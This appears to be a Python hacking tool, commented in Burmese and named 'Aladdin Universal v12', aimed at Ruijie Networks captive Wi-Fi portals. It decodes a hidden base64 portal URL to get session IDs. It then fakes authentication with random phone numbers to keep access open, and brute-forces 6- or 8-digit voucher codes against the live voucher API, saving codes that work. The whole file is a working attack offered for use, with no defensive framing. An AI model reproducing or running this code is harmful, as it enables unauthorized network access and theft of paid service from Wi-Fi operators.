import os
import re
import sys
import base64
import random
import string
import time
import asyncio
import aiohttp
import requests
import urllib3

# SSL Error ပိတ်ခြင်း (ဖုန်းအဟောင်းများအတွက်)
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# အရောင်များ
w, g, y, r, b = "\033[1;00m", "\033[1;32m", "\033[1;33m", "\033[1;31m", "\033[1;34m"

# Path Fix: Script ရှိတဲ့ နေရာကို အသေမှတ်သားခြင်း (GitHub Clone အတွက် အရေးကြီးဆုံး)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))
IP_FILE = os.path.join(BASE_DIR, ".ip")

def Logo():
    os.system("clear")
    print(f"{b}    ___    __    ___    ____  ____  _____  _   __")
    print(f"   /   |  / /   /   |  / __ \/ __ \/  _/ |/ / / /")
    print(f"  / /| | / /   / /| | / / / / / / // / |   / / / ")
    print(f" / ___ |/ /___/ ___ |/ /_/ / /_/ // / /   |/_/  ")
    print(f"/_/  |_/_____/_/  |_/_____/_____/___//_/|_/(_)  {w}")
    print(f"{g}           [ ALADDIN UNIVERSAL v12 ]{w}")
    print("-" * 50)

async def get_session_id(session, session_url):
    headers = {'User-Agent': 'Mozilla/5.0 (Linux; Android 10; K)'}
    try:
        # verify_ssl=False က GitHub ကနေ clone တဲ့အခါ တက်တတ်တဲ့ cert error ကို ဖြေရှင်းပေးပါတယ်
        async with session.get(session_url, headers=headers, timeout=15, ssl=False) as req:
            match = re.search(r"[?&]sessionId=([a-zA-Z0-9]+)", str(req.url))
            return match.group(1) if match else None
    except: return None

class AladdinTool:
    def __init__(self):
        raw_url = b'aHR0cHM6Ly9wb3J0YWwtYXMucnVpamllbmV0d29ya3MuY29tL2FwaS9hdXRoL3dpZmlkb2c/c3RhZ2U9cG9ydGFsJmd3X2lkPTU4YjRiYmNiZmQwZCZnd19zbj1IMVU0MFNYMDExNTA3Jmd3X2FkZHJlc3M9MTkyLjE2OC45OS4xJmd3X3BvcnQ9MjA2MCZpcD0xOTIuMTY4Ljk5LjU0Jm1hYz0zYTpkZDo3ZTo2NDo4NzozNiZzbG90X251bT0xMyZuYXNpcD0xOTIuMTY4LjEuMTczJnNzaWQ9VkxBTjk5JnVzdGF0ZT0wJm1hY19yZXE9MSZ1cmw9aHR0cCUzQSUyRiUyRjE5Mi4xNjguMC4xJTJGJmNoYXBfaWQ9JTVDMzEwJmNoYXBfY2hhbGxlbmdlPSU1QzIxNiU1QzE2MCU1QzEyMiU1QzE3NyU1QzIxNyU1QzM2MCU1QzM2MyU1QzMyMSU1QzA1NiU1QzExMyU1QzIzMiU1QzIyMSU1QzMzMiU1QzI2MCU1QzI1MCU1QzAwMQ=='
        self.session_url = base64.b64decode(raw_url).decode('utf-8', errors='ignore')
        try:
            self.ip = open(IP_FILE, "r").read().strip()
        except:
            self.ip = "192.168.0.1"

    async def keep_alive(self):
        Logo()
        print(f"{g}[+] Internet Keep-Alive Running...{w}")
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(connector=connector) as session:
            session_id = None
            while True:
                if not session_id:
                    session_id = await get_session_id(session, self.session_url)
                
                if session_id:
                    params = {'token': session_id, 'phoneNumber': '09'+''.join(random.choice(string.digits) for _ in range(8))}
                    try:
                        async with session.post(f"http://{self.ip}:2060/wifidog/auth?", params=params, timeout=10) as res:
                            print(f"{w}[{time.strftime('%H:%M:%S')}] Status: {res.status} - Online{w}")
                    except: session_id = None
                await asyncio.sleep(5)

    async def voucher_hack(self, length):
        Logo()
        print(f"{g}[+] Hacking {length}-Digit Vouchers...{w}")
        async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=False)) as session:
            session_id = None
            while True:
                if not session_id:
                    session_id = await get_session_id(session, self.session_url)
                if session_id:
                    code = "".join(random.choice(string.digits) for _ in range(length))
                    data = {"accessCode": code, "sessionId": session_id, "apiVersion": 1}
                    try:
                        async with session.post("https://portal-as.ruijienetworks.com/api/auth/voucher/?lang=en_US", json=data, timeout=10) as req:
                            res = await req.json()
                            if 'logonUrl' in str(res):
                                print(f"\n{g}[SUCCESS] Found: {code}{w}")
                                open(os.path.join(BASE_DIR, "success.txt"), "a").write(f"{code}\n")
                            else:
                                print(f"{w}[TRYING] {code}", end='\r')
                    except: pass
                await asyncio.sleep(0.1)

def setup_process():
    Logo()
    print(f"{y}[*] Detecting Network...{w}")
    try:
        r = requests.get("http://192.168.0.1", timeout=10, verify=False)
        ip = re.search('gw_address=(.*?)&', r.url).group(1)
        with open(IP_FILE, "w") as f: f.write(ip)
        print(f"{g}[+] Setup Success! IP: {ip}{w}")
    except:
        print(f"{r}[!] Connection Failed. Check WiFi connection.{w}")
    time.sleep(2)

if __name__ == "__main__":
    tool = AladdinTool()
    while True:
        Logo()
        print("[1] Start Setup\n[2] Internet Keep-Alive\n[3] Voucher Hack (6 Digit)\n[4] Voucher Hack (8 Digit)\n[0] Exit")
        choice = input(f"\n{y}Select > {w}")
        if choice == '1': setup_process()
        elif choice == '2':
            try: asyncio.run(tool.keep_alive())
            except KeyboardInterrupt: pass
        elif choice in ['3', '4']:
            length = 6 if choice == '3' else 8
            try: asyncio.run(tool.voucher_hack(length))
            except KeyboardInterrupt: pass
        elif choice == '0': break
        
